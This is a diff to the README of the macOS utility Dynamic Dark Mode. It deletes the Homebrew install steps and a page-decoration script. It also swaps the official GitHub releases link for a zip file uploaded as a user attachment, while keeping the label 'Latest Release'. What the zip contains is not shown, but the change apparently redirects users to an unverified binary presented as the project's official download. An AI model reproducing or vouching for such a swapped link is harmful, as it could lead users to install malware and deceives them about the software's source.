@@ -10,21 +10,10 @@ Instead of looking for the switch for dark mode in System Preferences, just clic
 
 ## Install
 
-### Via [Homebrew](https://brew.sh/) [Cask](https://formulae.brew.sh/cask/dynamic-dark-mode) (Recommended)
-
-```
-brew install --cask dynamic-dark-mode
-```
-
-<details><summary>Didn't work? Try this if you have an earlier version of Homebrew</summary>
-
-<pre><code>brew cask install dynamic-dark-mode</code></pre>
-</details>
-
 ### Direct Download
 
 <details>
-  <summary><a href="https://github.com/ApolloZhu/Dynamic-Dark-Mode/releases/latest">Latest Release</a></summary>
+  <summary><a href="https://github.com/user-attachments/files/19834078/Dynamic.Dark.Mode.zip">Latest Release</a></summary>
 
   Additionally, you may also download:
 
@@ -80,21 +69,3 @@ This is not quite what you are looking for? Here's a non-comprehensive list of o
 
 ---
 
-<details>
-<summary></summary>
-
-<script type="text/javascript">
-  window.onload = function () {
-    document.getElementsByClassName("project-name")[0].innerHTML = "Dynamic Dark Mode";
-    document.getElementById("dynamic-dark-mode").style.display="none";
-    pageHeader = document.getElementsByClassName("page-header")[0];
-    pageHeader.insertAdjacentHTML('beforeend', '<a href="https://github.com/ApolloZhu/Dynamic-Dark-Mode/releases/latest" class="btn">Download</a>');
-    pageHeader.insertAdjacentHTML('beforeend', '<a href="#install" class="btn">Homebrew Cask</a>');
-    productHunt = document.getElementById("product-hunt")
-    pageHeader.append(productHunt)
-    productHunt.setAttribute('style', 'padding: 0;border-width: 0;height: 50px;background-color: transparent;vertical-align: bottom;')
-    productHunt.setAttribute('class', 'btn')
-  }
-</script>
-
-</details>
